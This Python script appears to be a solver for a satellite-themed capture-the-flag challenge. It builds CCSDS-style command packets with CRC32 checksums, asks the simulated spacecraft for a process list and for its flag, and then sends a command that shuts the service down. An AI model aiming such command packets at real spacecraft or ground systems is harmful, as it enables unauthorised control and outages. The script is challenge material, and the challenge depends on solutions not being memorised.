#!/bin/python3
import zlib
import bitstring
import os
import sys
import socket
import struct
import random
import threading
import time
import math

FLAG_APID = 100 
FLAG_INTERVAL = 4.0
CMD_APID = 108
PAYLOAD_APID = 110
PAYLOAD_INTERVAL = 2.0
HK_APID = 106


# class to put a lock around the socket so that multiple threads can use it
class socketSender:

    def __init__(self, host, port):

        self.lock = threading.Lock()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((host, port))

    def send(self, message):

        with self.lock:

            try:
                self.sock.sendall(message)

            except:

                sys.stderr.write("exception in sending\n")
                return False
            
        return True

    def recv(self, amount):


        message = b''

        with self.lock:

            while len(message) != amount:
                try:
                    message += self.sock.recv(amount - len(message))

                except:

                    sys.stderr.write("exception in sending\n")
                    return b''
            
        return message


class cmdSender:

    def __init__(self, APID, serversocket):

        self.enabled = False
        self.packet_version = 0
        self.packet_type = 0 #telemetry
        self.sec_header_flag = 0 # no secondary header
        self.APID = APID
        self.sequence_flags = 3 # its a complete packet, not fragmented
        self.packet_sequence_count = random.randint(1000, 10000)
        self.packet_data_length = 0

        self.socket = serversocket
        self._timer = None
        self.running = False
        self.tlmData = None # this is set to a bytes object in updateTlmData()

 
    def send(self, payload):


        # self.packet_data_length = len(payload) - 1

        # add four bytes for a crc32
        self.packet_data_length = len(payload) - 1 + 4

        packet = bitstring.pack('uint:3, uint:1, uint:1, uint:11, uint:2, uint:14, uint:16',
            self.packet_version, self.packet_type, self.sec_header_flag, self.APID, self.sequence_flags,
            self.packet_sequence_count, self.packet_data_length)

        packethdr = packet.tobytes()

        wholepacket = packethdr + payload

        crc = zlib.crc32(wholepacket)

        wholepacket += struct.pack(">I", crc)

        self.packet_sequence_count += 1

        if not self.socket.send(wholepacket):
            return False

        return True

if __name__ == '__main__':

    Host = os.getenv("HOST", "127.0.0.1")
    Port = int(os.getenv("PORT", 5036))

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((Host, Port))

    ticket = os.getenv("TICKET", "")
    if len(ticket):
        sock.recv(128)
        sock.send((ticket + "\n").encode("utf-8"))

    #LCM - re-enable below for production
    line = sock.recv(128)

    Host, Port = line.split(b" ")[-1].split(b":")
    Host = Host.decode('utf-8')
    Port = int(Port.decode('utf-8'))
    print(Host,Port)

    cmdsock = socketSender(Host, Port)
    tlmsend = cmdSender(CMD_APID, cmdsock)
    flagsend = cmdSender(FLAG_APID, cmdsock)
    hksend = cmdSender(HK_APID, cmdsock)
    appsend = cmdSender(7, cmdsock)

    # send this to get a process list
    hksend.send(b'\x65')

    # to increase the chances, have it poll the flag process every second
    interval = 1
    command = b'\x03' + struct.pack(">H", interval)
    flagsend.send(command)

    # now request the flag be sent
    flagsend.send(b'\x02')

    while True:

        data = cmdsock.recv(6)

        # keep sending the send me the flag command until it works
        flagsend.send(b'\x02')

        s = bitstring.BitArray(data)

        print(data)
        print(s)

        version, type, sec_header, apid, sequence_flags, sequence_count, data_length = s.unpack('uint:3, uint:1, uint:1, uint:11, uint:2, uint:14, uintbe:16')

        print("APID: {} Flags: {}: Sequence#: {}  Length: {}\n".format(apid, sequence_flags, sequence_count, data_length))


        data += cmdsock.recv(data_length +1 )

        if apid == HK_APID:

            print("HK message: {}".format(data[6:-4]))


        elif apid == PAYLOAD_APID:

            results = struct.unpack(">QQQQ", data[6:38])

            print(results)


        elif apid == FLAG_APID:

            print(data[6:-4])

            if data[6:10] == b'flag':

                # we got the flag--send a command to shutdown the service
                appsend.send(b'\x04')
                time.sleep(1)
                break
